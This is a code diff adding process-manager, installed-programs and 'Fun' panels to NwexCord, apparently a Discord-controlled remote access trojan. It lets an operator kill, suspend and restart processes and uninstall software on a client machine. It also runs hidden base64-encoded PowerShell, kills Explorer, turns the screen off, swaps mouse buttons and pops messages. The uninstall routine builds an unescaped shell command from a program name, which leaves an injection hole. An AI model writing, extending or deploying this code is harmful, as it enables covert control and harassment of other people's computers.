+            handle = ctypes.windll.kernel32.OpenProcess(PROCESS_SUSPEND_RESUME, False, pid)
+            if handle:
+                ntdll = ctypes.windll.ntdll
+                ntdll.NtResumeProcess(handle)
+                ctypes.windll.kernel32.CloseHandle(handle)
+                return True, "Process resumed."
+            return False, "Could not open process."
+        except Exception as e:
+            return False, str(e)
+
+
+def build_process_embed(session_id: str, page: int = 0, processes: list = None, selected_idx: int = -1):
+    """Build the Process Manager embed with table-style layout and pagination."""
+    if processes is None:
+        processes = ProcessManager.get_processes()
+        
+    per_page = 20
+    total = len(processes)
+    total_pages = max(1, (total + per_page - 1) // per_page)
+    page = max(0, min(page, total_pages - 1))
+    
+    start = page * per_page
+    end = min(start + per_page, total)
+    page_procs = processes[start:end]
+    
+    # Build table header
+    header = f"{'[ Name ]':<28} {'[ PID ]':<8} {'[ Description ]'}"
+    sep = "\u2501" * 64
+    
+    rows = ""
+    for i, proc in enumerate(page_procs):
+        name = proc['name']
+        if len(name) > 24:
+            name = name[:21] + "..."
+        
+        desc = proc['description']
+        if len(desc) > 24:
+            desc = desc[:21] + "..."
+        
+        overall_idx = start + i
+        marker = "\u25ba" if overall_idx == selected_idx else " "
+        pid_str = str(proc['pid'])
+        
+        rows += f"{marker} {name:<26} {pid_str:<6} {desc}\n"
+    
+    if not processes:
+        rows = "  (No processes found)\n"
+    
+    table_block = f"```\n{header}\n{sep}\n{rows}```"
+    
+    if len(table_block) > 4000:
+        table_block = table_block[:3990] + "\n...```"
+    
+    selected_count = 1 if selected_idx >= 0 else 0
+    
+    embed = discord.Embed(
+        title=f"\ud83d\udcca Process Manager : {session_id}",
+        description=table_block,
+        color=discord.Color.from_rgb(0, 120, 215)
+    )
+    embed.set_footer(text=f"Page [{page+1}/{total_pages}]  Selected [{selected_count}]  Process [{total}]")
+    
+    return embed, processes, page, total_pages
+
+
+class ProcessSelect(discord.ui.Select):
+    """Dropdown to select a process from the current page."""
+    def __init__(self, session_id: str, page: int, processes: list):
+        self.session_id = session_id
+        self.page = page
+        self.processes_data = processes
+        
+        per_page = 20
+        start = page * per_page
+        end = min(start + per_page, len(processes))
+        page_procs = processes[start:end]
+        
+        if page_procs:
+            options = []
+            for i, proc in enumerate(page_procs):
+                overall_idx = start + i
+                label = f"{proc['name']} (PID: {proc['pid']})"
+                label = label[:100]
+                options.append(discord.SelectOption(
+                    label=label,
+                    description=proc['description'][:100] if proc['description'] else "No description",
+                    value=str(overall_idx),
+                    emoji="\ud83d\udcca"
+                ))
+        else:
+            options = [discord.SelectOption(label="(no processes)", value="_none")]
+        
+        super().__init__(placeholder="\ud83d\udcca Select a process...", options=options, row=0)
+    
+    async def callback(self, interaction: discord.Interaction):
+        selected = self.values[0]
+        if selected == "_none":
+            await interaction.response.defer()
+            return
+        
+        idx = int(selected)
+        embed, procs, pg, tp = build_process_embed(self.session_id, self.page, self.processes_data, selected_idx=idx)
+        view = ProcessManagerView(self.session_id, pg, self.processes_data, selected_idx=idx)
+        await interaction.response.edit_message(content=None, embed=embed, view=view)
+
+
+class ProcessManagerView(discord.ui.View):
+    """Interactive view for Process Manager with Refresh, Close, Restart, Suspend, Resume."""
+    def __init__(self, session_id: str, page: int = 0, processes: list = None, selected_idx: int = -1):
+        super().__init__(timeout=300)
+        self.session_id = session_id
+        self.page = page
+        self.selected_idx = selected_idx
+        self.processes_data = processes if processes is not None else ProcessManager.get_processes()
+        self.total_pages = max(1, (len(self.processes_data) + 19) // 20)
+        
+        # Add select dropdown
+        self.add_item(ProcessSelect(session_id, page, self.processes_data))
+    
+    def _get_selected(self):
+        """Get the selected process or None."""
+        if self.selected_idx < 0 or self.selected_idx >= len(self.processes_data):
+            return None
+        return self.processes_data[self.selected_idx]
+    
+    @discord.ui.button(label="\u25c0", style=discord.ButtonStyle.secondary, row=1)
+    async def prev_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        new_page = max(0, self.page - 1)
+        embed, procs, pg, tp = build_process_embed(self.session_id, new_page, self.processes_data)
+        view = ProcessManagerView(self.session_id, pg, self.processes_data)
+        await interaction.response.edit_message(content=None, embed=embed, view=view)
+    
+    @discord.ui.button(label="\u25b6", style=discord.ButtonStyle.secondary, row=1)
+    async def next_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        new_page = min(self.total_pages - 1, self.page + 1)
+        embed, procs, pg, tp = build_process_embed(self.session_id, new_page, self.processes_data)
+        view = ProcessManagerView(self.session_id, pg, self.processes_data)
+        await interaction.response.edit_message(content=None, embed=embed, view=view)
+    
+    @discord.ui.button(label="Refresh", emoji="\ud83d\udd04", style=discord.ButtonStyle.success, row=1)
+    async def refresh_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        new_procs = ProcessManager.get_processes()
+        embed, procs, pg, tp = build_process_embed(self.session_id, 0, new_procs)
+        view = ProcessManagerView(self.session_id, 0, new_procs)
+        await interaction.response.edit_message(content=None, embed=embed, view=view)
+    
+    @discord.ui.button(label="Close", emoji="\ud83d\udeab", style=discord.ButtonStyle.danger, row=1)
+    async def close_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        target = self._get_selected()
+        if not target:
+            await interaction.response.send_message("\u274c Please select a process first!", ephemeral=True)
+            return
+        
+        success, msg = ProcessManager.close_process(target['pid'])
+        new_procs = ProcessManager.get_processes()
+        
+        per_page = 20
+        total = len(new_procs)
+        total_pages = max(1, (total + per_page - 1) // per_page)
+        page = max(0, min(self.page, total_pages - 1))
+        
+        embed, procs, pg, tp = build_process_embed(self.session_id, page, new_procs)
+        
+        if success:
+            embed.add_field(name="\u2705 Closed", value=f"`{target['name']}` (PID: {target['pid']})", inline=False)
+        else:
+            embed.add_field(name="\u274c Failed", value=f"`{target['name']}` \u2014 {msg}", inline=False)
+        
+        view = ProcessManagerView(self.session_id, pg, new_procs)
+        await interaction.response.edit_message(content=None, embed=embed, view=view)
+    
+    @discord.ui.button(label="Restart", emoji="\ud83d\udd04", style=discord.ButtonStyle.primary, row=2)
+    async def restart_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        target = self._get_selected()
+        if not target:
+            await interaction.response.send_message("\u274c Please select a process first!", ephemeral=True)
+            return
+        
+        success, msg = ProcessManager.restart_process(target['pid'], target['name'])
+        new_procs = ProcessManager.get_processes()
+        
+        per_page = 20
+        total = len(new_procs)
+        total_pages = max(1, (total + per_page - 1) // per_page)
+        page = max(0, min(self.page, total_pages - 1))
+        
+        embed, procs, pg, tp = build_process_embed(self.session_id, page, new_procs)
+        
+        if success:
+            embed.add_field(name="\u2705 Restarted", value=f"`{target['name']}` (PID: {target['pid']})", inline=False)
+        else:
+            embed.add_field(name="\u274c Failed", value=f"`{target['name']}` \u2014 {msg}", inline=False)
+        
+        view = ProcessManagerView(self.session_id, pg, new_procs)
+        await interaction.response.edit_message(content=None, embed=embed, view=view)
+    
+    @discord.ui.button(label="Suspend", emoji="\u23f8", style=discord.ButtonStyle.secondary, row=2)
+    async def suspend_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        target = self._get_selected()
+        if not target:
+            await interaction.response.send_message("\u274c Please select a process first!", ephemeral=True)
+            return
+        
+        success, msg = ProcessManager.suspend_process(target['pid'])
+        embed, procs, pg, tp = build_process_embed(self.session_id, self.page, self.processes_data, selected_idx=self.selected_idx)
+        
+        if success:
+            embed.add_field(name="\u23f8 Suspended", value=f"`{target['name']}` (PID: {target['pid']})", inline=False)
+        else:
+            embed.add_field(name="\u274c Failed", value=f"`{target['name']}` \u2014 {msg}", inline=False)
+        
+        view = ProcessManagerView(self.session_id, self.page, self.processes_data, selected_idx=self.selected_idx)
+        await interaction.response.edit_message(content=None, embed=embed, view=view)
+    
+    @discord.ui.button(label="Resume", emoji="\u25b6", style=discord.ButtonStyle.secondary, row=2)
+    async def resume_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        target = self._get_selected()
+        if not target:
+            await interaction.response.send_message("\u274c Please select a process first!", ephemeral=True)
+            return
+        
+        success, msg = ProcessManager.resume_process(target['pid'])
+        embed, procs, pg, tp = build_process_embed(self.session_id, self.page, self.processes_data, selected_idx=self.selected_idx)
+        
+        if success:
+            embed.add_field(name="\u25b6 Resumed", value=f"`{target['name']}` (PID: {target['pid']})", inline=False)
+        else:
+            embed.add_field(name="\u274c Failed", value=f"`{target['name']}` \u2014 {msg}", inline=False)
+        
+        view = ProcessManagerView(self.session_id, self.page, self.processes_data, selected_idx=self.selected_idx)
+        await interaction.response.edit_message(content=None, embed=embed, view=view)
+    
+    @discord.ui.button(label="Back to Tools", emoji="\u2b05", style=discord.ButtonStyle.secondary, row=2)
+    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.edit_message(content=None, embed=embed_tools_panel(), view=ToolsPanelView())
+
+
+# ========================================
+# Interactive Installed Programs UI
+# ========================================
+
+class InstalledProgramsManager:
+    """Helper class to get installed programs and uninstall them."""
+    
+    REG_PATHS = [
+        r'HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall',
+        r'HKLM\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall',
+        r'HKCU\Software\Microsoft\Windows\CurrentVersion\Uninstall',
+    ]
+    
+    @staticmethod
+    def get_programs():
+        """Get list of installed programs from registry."""
+        programs = []
+        seen = set()
+        for reg_path in InstalledProgramsManager.REG_PATHS:
+            try:
+                cmd = f'powershell "Get-ItemProperty \'Registry::{reg_path}\\*\' -ErrorAction SilentlyContinue | Where-Object {{ $_.DisplayName -ne $null }} | Select-Object DisplayName, UninstallString | Sort-Object DisplayName | Format-Table -HideTableHeaders"'
+                result = subprocess.run(
+                    cmd, shell=True, capture_output=True, text=True,
+                    timeout=15, encoding='utf-8', errors='replace'
+                )
+                for line in result.stdout.strip().split('\n'):
+                    line = line.strip()
+                    if not line:
+                        continue
+                    # Split into name and uninstall string
+                    parts = line.split(None, 1)
+                    if len(parts) >= 1:
+                        # The name may contain spaces, so we need a smarter approach
+                        # Use the full line as it may be just the name
+                        name = line.strip()
+                        if name and name not in seen:
+                            seen.add(name)
+                            programs.append({
+                                'name': name,
+                            })
+            except Exception:
+                pass
+        
+        # Sort alphabetically
+        programs.sort(key=lambda p: p['name'].lower())
+        return programs
+    
+    @staticmethod
+    def uninstall_program(name: str):
+        """Attempt to uninstall a program by finding its UninstallString."""
+        try:
+            for reg_path in InstalledProgramsManager.REG_PATHS:
+                cmd = f"powershell \"Get-ItemProperty 'Registry::{reg_path}\\*' -ErrorAction SilentlyContinue | Where-Object {{ $_.DisplayName -eq '{name}' }} | Select-Object -ExpandProperty UninstallString\""
+                result = subprocess.run(
+                    cmd, shell=True, capture_output=True, text=True,
+                    timeout=10, encoding='utf-8', errors='replace'
+                )
+                uninstall_str = result.stdout.strip()
+                if uninstall_str:
+                    # Execute uninstall command
+                    subprocess.Popen(uninstall_str, shell=True)
+                    return True, f"Uninstall started for: {name}"
+            return False, "Uninstall string not found."
+        except Exception as e:
+            return False, str(e)
+
+
+def build_programs_embed(session_id: str, page: int = 0, programs: list = None, selected_idx: int = -1):
+    """Build the Installed Programs embed with table-style layout and pagination."""
+    if programs is None:
+        programs = InstalledProgramsManager.get_programs()
+    
+    per_page = 15
+    total = len(programs)
+    total_pages = max(1, (total + per_page - 1) // per_page)
+    page = max(0, min(page, total_pages - 1))
+    
+    start = page * per_page
+    end = min(start + per_page, total)
+    page_progs = programs[start:end]
+    
+    # Build table header
+    header = "[ Name ]"
+    sep = "\u2501" * 54
+    
+    rows = ""
+    for i, prog in enumerate(page_progs):
+        overall_idx = start + i
+        name = prog['name']
+        if len(name) > 50:
+            name = name[:47] + "..."
+        
+        marker = "\u25ba" if overall_idx == selected_idx else " "
+        rows += f"{marker} \ud83d\udce6 {name}\n"
+    
+    if not programs:
+        rows = "  (No programs found)\n"
+    
+    table_block = f"```\n{header}\n{sep}\n{rows}```"
+    
+    if len(table_block) > 4000:
+        table_block = table_block[:3990] + "\n...```"
+    
+    selected_count = 1 if selected_idx >= 0 else 0
+    
+    embed = discord.Embed(
+        title=f"\ud83d\udcbf Installed Programs : {session_id[:16]}...",
+        description=table_block,
+        color=discord.Color.from_rgb(0, 120, 215)
+    )
+    embed.set_footer(text=f"Page [{page+1}/{total_pages}]  Selected [{selected_count}]  Installed [{total}]")
+    
+    return embed, programs, page, total_pages
+
+
+class ProgramsSelect(discord.ui.Select):
+    """Dropdown to select a program from the current page."""
+    def __init__(self, session_id: str, page: int, programs: list):
+        self.session_id = session_id
+        self.page = page
+        self.programs_data = programs
+        
+        per_page = 15
+        start = page * per_page
+        end = min(start + per_page, len(programs))
+        page_progs = programs[start:end]
+        
+        if page_progs:
+            options = []
+            for i, prog in enumerate(page_progs):
+                overall_idx = start + i
+                label = prog['name'][:100]
+                options.append(discord.SelectOption(
+                    label=label,
+                    value=str(overall_idx),
+                    emoji="\ud83d\udce6"
+                ))
+        else:
+            options = [discord.SelectOption(label="(no programs)", value="_none")]
+        
+        super().__init__(placeholder="\ud83d\udcbf Select a program...", options=options, row=0)
+    
+    async def callback(self, interaction: discord.Interaction):
+        selected = self.values[0]
+        if selected == "_none":
+            await interaction.response.defer()
+            return
+        
+        idx = int(selected)
+        embed, progs, pg, tp = build_programs_embed(self.session_id, self.page, self.programs_data, selected_idx=idx)
+        view = InstalledProgramsView(self.session_id, pg, self.programs_data, selected_idx=idx)
+        await interaction.response.edit_message(content=None, embed=embed, view=view)
+
+
+class InstalledProgramsView(discord.ui.View):
+    """Interactive view for Installed Programs with Refresh, Uninstall, pagination."""
+    def __init__(self, session_id: str, page: int = 0, programs: list = None, selected_idx: int = -1):
+        super().__init__(timeout=300)
+        self.session_id = session_id
+        self.page = page
+        self.selected_idx = selected_idx
+        self.programs_data = programs if programs is not None else InstalledProgramsManager.get_programs()
+        self.total_pages = max(1, (len(self.programs_data) + 14) // 15)
+        
+        # Add select dropdown
+        self.add_item(ProgramsSelect(session_id, page, self.programs_data))
+    
+    @discord.ui.button(label="\u25c0", style=discord.ButtonStyle.secondary, row=1)
+    async def prev_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        new_page = max(0, self.page - 1)
+        embed, progs, pg, tp = build_programs_embed(self.session_id, new_page, self.programs_data)
+        view = InstalledProgramsView(self.session_id, pg, self.programs_data)
+        await interaction.response.edit_message(content=None, embed=embed, view=view)
+    
+    @discord.ui.button(label="\u25b6", style=discord.ButtonStyle.secondary, row=1)
+    async def next_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        new_page = min(self.total_pages - 1, self.page + 1)
+        embed, progs, pg, tp = build_programs_embed(self.session_id, new_page, self.programs_data)
+        view = InstalledProgramsView(self.session_id, pg, self.programs_data)
+        await interaction.response.edit_message(content=None, embed=embed, view=view)
+    
+    @discord.ui.button(label="Refresh", emoji="\ud83d\udd04", style=discord.ButtonStyle.success, row=1)
+    async def refresh_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        new_progs = InstalledProgramsManager.get_programs()
+        embed, progs, pg, tp = build_programs_embed(self.session_id, 0, new_progs)
+        view = InstalledProgramsView(self.session_id, 0, new_progs)
+        await interaction.response.edit_message(content=None, embed=embed, view=view)
+    
+    @discord.ui.button(label="Uninstall", emoji="\ud83d\udeab", style=discord.ButtonStyle.danger, row=1)
+    async def uninstall_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if self.selected_idx < 0 or self.selected_idx >= len(self.programs_data):
+            await interaction.response.send_message("\u274c Please select a program first!", ephemeral=True)
+            return
+        
+        target = self.programs_data[self.selected_idx]
+        success, msg = InstalledProgramsManager.uninstall_program(target['name'])
+        
+        embed, progs, pg, tp = build_programs_embed(self.session_id, self.page, self.programs_data)
+        
+        if success:
+            embed.add_field(name="\u2705 Uninstall", value=f"`{target['name']}`", inline=False)
+        else:
+            embed.add_field(name="\u274c Failed", value=f"`{target['name']}` \u2014 {msg}", inline=False)
+        
+        view = InstalledProgramsView(self.session_id, self.page, self.programs_data)
+        await interaction.response.edit_message(content=None, embed=embed, view=view)
+    
+    @discord.ui.button(label="Back to Tools", emoji="\u2b05", style=discord.ButtonStyle.secondary, row=1)
+    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.edit_message(content=None, embed=embed_tools_panel(), view=ToolsPanelView())
+
+
+# ========================================
+# Fun Panel
+# ========================================
+
+class FunManager:
+    """Helper class for Fun panel operations."""
+    
+    @staticmethod
+    def open_url(url: str):
+        try:
+            webbrowser.open(url)
+            return True, f"Opened: {url}"
+        except Exception as e:
+            return False, str(e)
+    
+    @staticmethod
+    def show_messagebox(title: str, message: str, icon="Information", button="OK"):
+        try:
+            icon_flags = {"Information": 0x40, "Error": 0x10, "Warning": 0x30, "Question": 0x20}
+            button_flags = {"OK": 0x0, "OKCancel": 0x01, "YesNo": 0x04, "YesNoCancel": 0x03, "RetryCancel": 0x05, "AbortRetryIgnore": 0x02}
+            flags = icon_flags.get(icon, 0x40) | button_flags.get(button, 0x0) | 0x00040000
+            WS_EX_TOOLWINDOW = 0x00000080
+            WS_POPUP = 0x80000000
+            hwnd = ctypes.windll.user32.CreateWindowExW(WS_EX_TOOLWINDOW, "Static", "", WS_POPUP, 0, 0, 0, 0, 0, 0, 0, 0)
+            result = ctypes.windll.user32.MessageBoxW(hwnd, message, title, flags)
+            ctypes.windll.user32.DestroyWindow(hwnd)
+            return True, f"MessageBox shown. Result: {result}"
+        except Exception as e:
+            return False, str(e)
+    
+    @staticmethod
+    def show_balloon_tip(title: str, text: str, icon="Info"):
+        try:
+            icon_map = {"Info": "Info", "Warning": "Warning", "Error": "Error", "None": "None"}
+            ps_icon = icon_map.get(icon, "Info")
+            title_esc = title.replace("'", "''")
+            text_esc = text.replace("'", "''")
+            script = (
+                f"Add-Type -AssemblyName System.Windows.Forms\n"
+                f"Add-Type -AssemblyName System.Drawing\n"
+                f"$n = New-Object System.Windows.Forms.NotifyIcon\n"
+                f"$n.Icon = [System.Drawing.SystemIcons]::Information\n"
+                f"$n.BalloonTipTitle = '{title_esc}'\n"
+                f"$n.BalloonTipText = '{text_esc}'\n"
+                f"$n.BalloonTipIcon = [System.Windows.Forms.ToolTipIcon]::{ps_icon}\n"
+                f"$n.Visible = $true\n"
+                f"$n.ShowBalloonTip(5000)\n"
+                f"Start-Sleep -Seconds 6\n"
+                f"$n.Dispose()"
+            )
+            encoded = base64.b64encode(script.encode('utf-16-le')).decode()
+            subprocess.Popen(f'powershell -WindowStyle Hidden -EncodedCommand {encoded}', shell=True, creationflags=0x08000000)
+            return True, f"BalloonTip shown: {title}"
+        except Exception as e:
+            return False, str(e)
+    
+    @staticmethod
+    def client_chat_input(message: str):
+        """Show an InputBox on client and return the typed response."""
+        try:
+            msg_esc = message.replace("'", "''")
+            script = f"Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::InputBox('{msg_esc}', 'NwexCord Chat')"
+            encoded = base64.b64encode(script.encode('utf-16-le')).decode()
+            result = subprocess.run(
+                f'powershell -WindowStyle Hidden -EncodedCommand {encoded}',
+                shell=True, capture_output=True, text=True, timeout=300,
+                encoding='utf-8', errors='replace'
+            )
+            response = result.stdout.strip()
+            return response if response else None
+        except Exception:
+            return None
+    
+    @staticmethod
+    def clock_show():
+        try:
+            tray = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
+            notify = ctypes.windll.user32.FindWindowExW(tray, 0, "TrayNotifyWnd", None)
+            clock = ctypes.windll.user32.FindWindowExW(notify, 0, "TrayClockWClass", None)
+            if clock:
+                ctypes.windll.user32.ShowWindow(clock, 5)
+                return True, "Clock shown."
+            return False, "Clock window not found."
+        except Exception as e:
+            return False, str(e)
+    
+    @staticmethod
+    def clock_hide():
+        try:
+            tray = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
+            notify = ctypes.windll.user32.FindWindowExW(tray, 0, "TrayNotifyWnd", None)
+            clock = ctypes.windll.user32.FindWindowExW(notify, 0, "TrayClockWClass", None)
+            if clock:
+                ctypes.windll.user32.ShowWindow(clock, 0)
+                return True, "Clock hidden."
+            return False, "Clock window not found."
+        except Exception as e:
+            return False, str(e)
+    
+    @staticmethod
+    def explorer_kill():
+        try:
+            subprocess.run('taskkill /F /IM explorer.exe', shell=True, timeout=10, capture_output=True, text=True)
+            return True, "Explorer killed."
+        except Exception as e:
+            return False, str(e)
+    
+    @staticmethod
+    def explorer_start():
+        try:
+            subprocess.Popen('explorer.exe', shell=True)
+            return True, "Explorer started."
+        except Exception as e:
+            return False, str(e)
+    
+    @staticmethod
+    def desktop_icons_show():
+        try:
+            progman = ctypes.windll.user32.FindWindowW("Progman", "Program Manager")
+            defview = ctypes.windll.user32.FindWindowExW(progman, 0, "SHELLDLL_DefView", None)
+            if not defview:
+                from ctypes import wintypes
+                WNDENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_bool, wintypes.HWND, wintypes.LPARAM)
+                found = [0]
+                def cb(hwnd, lp):
+                    dv = ctypes.windll.user32.FindWindowExW(hwnd, 0, "SHELLDLL_DefView", None)
+                    if dv: found[0] = dv; return False
+                    return True
+                ctypes.windll.user32.EnumWindows(WNDENUMPROC(cb), 0)
+                defview = found[0]
+            if defview:
+                lv = ctypes.windll.user32.FindWindowExW(defview, 0, "SysListView32", None)
+                if lv:
+                    ctypes.windll.user32.ShowWindow(lv, 5)
+                    return True, "Desktop icons shown."
+            return False, "Desktop view not found."
+        except Exception as e:
+            return False, str(e)
+    
+    @staticmethod
+    def desktop_icons_hide():
+        try:
+            progman = ctypes.windll.user32.FindWindowW("Progman", "Program Manager")
+            defview = ctypes.windll.user32.FindWindowExW(progman, 0, "SHELLDLL_DefView", None)
+            if not defview:
+                from ctypes import wintypes
+                WNDENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_bool, wintypes.HWND, wintypes.LPARAM)
+                found = [0]
+                def cb(hwnd, lp):
+                    dv = ctypes.windll.user32.FindWindowExW(hwnd, 0, "SHELLDLL_DefView", None)
+                    if dv: found[0] = dv; return False
+                    return True
+                ctypes.windll.user32.EnumWindows(WNDENUMPROC(cb), 0)
+                defview = found[0]
+            if defview:
+                lv = ctypes.windll.user32.FindWindowExW(defview, 0, "SysListView32", None)
+                if lv:
+                    ctypes.windll.user32.ShowWindow(lv, 0)
+                    return True, "Desktop icons hidden."
+            return False, "Desktop view not found."
+        except Exception as e:
+            return False, str(e)
+    
+    @staticmethod
+    def screen_off():
+        try:
+            ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
+            return True, "Screen turned off."
+        except Exception as e:
+            return False, str(e)
+    
+    @staticmethod
+    def screen_on():
+        try:
+            ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, -1)
+            ctypes.windll.user32.mouse_event(0x0001, 0, 1, 0, 0)
+            return True, "Screen turned on."
+        except Exception as e:
+            return False, str(e)
+    
+    @staticmethod
+    def swap_mouse_normal():
+        try:
+            ctypes.windll.user32.SwapMouseButton(False)
+            return True, "Mouse buttons set to normal."
+        except Exception as e:
+            return False, str(e)
+    
+    @staticmethod
+    def swap_mouse_swap():
+        try:
+            ctypes.windll.user32.SwapMouseButton(True)
+            return True, "Mouse buttons swapped."
+        except Exception as e:
+            return False, str(e)
+    
+    @staticmethod
+    def text_speak(text: str):
+        try:
+            text_escaped = text.replace("'", "''")
+            script = f"$voice = New-Object -ComObject SAPI.SpVoice; $voice.Speak('{text_escaped}')"
+            encoded = base64.b64encode(script.encode('utf-16-le')).decode()
+            subprocess.Popen(f'powershell -WindowStyle Hidden -EncodedCommand {encoded}', shell=True, creationflags=0x08000000)
+            return True, f"Speaking: {text}"
+        except Exception as e:
+            return False, str(e)
+    
+    @staticmethod
+    def volume_up():
+        try:
+            for _ in range(13):
+                ctypes.windll.user32.keybd_event(0xAF, 0, 0, 0)
+                ctypes.windll.user32.keybd_event(0xAF, 0, 0x0002, 0)
+            return True, "Volume +25%"
+        except Exception as e:
+            return False, str(e)
+    
+    @staticmethod
+    def volume_down():
+        try:
+            for _ in range(13):
+                ctypes.windll.user32.keybd_event(0xAE, 0, 0, 0)
+                ctypes.windll.user32.keybd_event(0xAE, 0, 0x0002, 0)
+            return True, "Volume -25%"
+        except Exception as e:
+            return False, str(e)
+    
+    @staticmethod
+    def volume_mute():
+        try:
+            ctypes.windll.user32.keybd_event(0xAD, 0, 0, 0)
+            ctypes.windll.user32.keybd_event(0xAD, 0, 0x0002, 0)
+            return True, "Volume muted/unmuted."
+        except Exception as e:
+            return False, str(e)
+
+
+def embed_fun_panel():
+    embed = discord.Embed(
+        title="\U0001f389 NwexCord Fun",
+        description=(
+            "Select a fun action from the buttons below!\n\n"
+            "\U0001f310 Open URL \u2022 \U0001f4ac Client Chat \u2022 \U0001f4e6 MessageBox \u2022 \U0001f5e3\ufe0f Text Speak\n"
+            "\U0001f550 Clock \u2022 \U0001f4fa Screen \u2022 \U0001f4c1 Explorer\n"
+            "\U0001f5a5\ufe0f Desktop \u2022 \U0001f5b1\ufe0f Mouse \u2022 \U0001f50a Volume"
+        ),
+        color=discord.Color.from_rgb(255, 85, 85)
+    )
+    embed.set_footer(text="NwexCord \u2022 Fun Panel")
+    return embed
+
+
+class OpenURLModal(discord.ui.Modal, title="Open URL"):
+    url_input = discord.ui.TextInput(label="URL", placeholder="https://example.com", required=True)
+    async def on_submit(self, interaction: discord.Interaction):
+        url = str(self.url_input).strip()
+        if not url.startswith("http"): url = "https://" + url
+        success, msg = FunManager.open_url(url)
+        e = discord.Embed(title=f"{'✅' if success else '❌'} Open URL", description=msg, color=discord.Color.green() if success else discord.Color.red())
+        e.set_footer(text="NwexCord • Fun")
+        await interaction.response.edit_message(content=None, embed=e, view=FunResultView())
+
+def build_chat_embed(chat_history, waiting=False):
+    desc = ""
+    for sender, msg in chat_history[-15:]:
+        desc += f"**{sender}:** {msg}\n"
+    if waiting:
+        desc += "\n\u23f3 *Waiting for client response...*"
+    if not desc:
+        desc = "*Start a conversation! Click Send to send a message to the client.*"
+    e = discord.Embed(title="\U0001f4ac Client Chat", description=desc, color=discord.Color.from_rgb(0, 180, 255))
+    e.set_footer(text=f"NwexCord \u2022 Chat \u2022 {len(chat_history)} messages")
+    return e
+
+class ClientChatSendModal(discord.ui.Modal, title="Send Message"):
+    msg_input = discord.ui.TextInput(label="Message", placeholder="Type your message...", required=True)
+    def __init__(self, chat_history):
+        super().__init__()
+        self.chat_history = chat_history
+    async def on_submit(self, interaction: discord.Interaction):
+        text = str(self.msg_input)
+        self.chat_history.append(("\U0001f9d1\u200d\U0001f4bb You", text))
+        embed = build_chat_embed(self.chat_history, waiting=True)
+        await interaction.response.edit_message(content=None, embed=embed, view=None)
+        loop = asyncio.get_event_loop()
+        response = await loop.run_in_executor(None, FunManager.client_chat_input, text)
+        if response:
+            self.chat_history.append(("\U0001f4bb Client", response))
+        else:
+            self.chat_history.append(("\U0001f4bb Client", "*(No response)*"))
+        embed = build_chat_embed(self.chat_history)
+        view = ClientChatView(self.chat_history)
+        await interaction.edit_original_response(content=None, embed=embed, view=view)
+
+class ClientChatView(discord.ui.View):
+    def __init__(self, chat_history=None):
+        super().__init__(timeout=600)
+        self.chat_history = chat_history if chat_history is not None else []
+    @discord.ui.button(label="Send", emoji="\U0001f4e4", style=discord.ButtonStyle.success)
+    async def send_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.send_modal(ClientChatSendModal(self.chat_history))
+    @discord.ui.button(label="Clear", emoji="\U0001f5d1\ufe0f", style=discord.ButtonStyle.danger)
+    async def clear_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        self.chat_history.clear()
+        await interaction.response.edit_message(content=None, embed=build_chat_embed(self.chat_history), view=ClientChatView(self.chat_history))
+    @discord.ui.button(label="\u2b05 Back", style=discord.ButtonStyle.secondary)
+    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.edit_message(content=None, embed=embed_fun_panel(), view=FunPanelView())
+
+
+class TextSpeakModal(discord.ui.Modal, title="Text to Speech"):
+    text_input = discord.ui.TextInput(label="Text", placeholder="Enter text to speak...", style=discord.TextStyle.paragraph, required=True)
+    async def on_submit(self, interaction: discord.Interaction):
+        text = str(self.text_input)
+        success, msg = FunManager.text_speak(text)
+        e = discord.Embed(title=f"{'✅' if success else '❌'} Text Speak", description=msg, color=discord.Color.green() if success else discord.Color.red())
+        e.set_footer(text="NwexCord • Fun")
+        await interaction.response.edit_message(content=None, embed=e, view=FunResultView())
+
+# --- MessageBox System (with tabs: MessageBox + BalloonTooltip) ---
+
+class MessageBoxSendModal(discord.ui.Modal, title="MessageBox"):
+    title_input = discord.ui.TextInput(label="Title", placeholder="MessageBox", default="MessageBox", required=True)
+    message_input = discord.ui.TextInput(label="Message", placeholder="Hello World!", style=discord.TextStyle.paragraph, required=True)
+    def __init__(self, icon="Information", button="OK"):
+        super().__init__()
+        self.icon = icon
+        self.button = button
+    async def on_submit(self, interaction: discord.Interaction):
+        t, m = str(self.title_input), str(self.message_input)
+        threading.Thread(target=FunManager.show_messagebox, args=(t, m, self.icon, self.button), daemon=True).start()
+        e = discord.Embed(title="📦 MessageBox", description=f"**Icon:** {self.icon}\n**Button:** {self.button}\n**Title:** `{t}`\n**Message:** `{m}`", color=discord.Color.green())
+        e.set_footer(text="NwexCord • Fun")
+        await interaction.response.edit_message(content=None, embed=e, view=FunResultView())
+
+class BalloonTipSendModal(discord.ui.Modal, title="BalloonTooltip"):
+    title_input = discord.ui.TextInput(label="Title", placeholder="BalloonTip", default="BalloonTip", required=True)
+    text_input = discord.ui.TextInput(label="Text", placeholder="Hello World!", style=discord.TextStyle.paragraph, required=True)
+    def __init__(self, icon="Info"):
+        super().__init__()
+        self.icon = icon
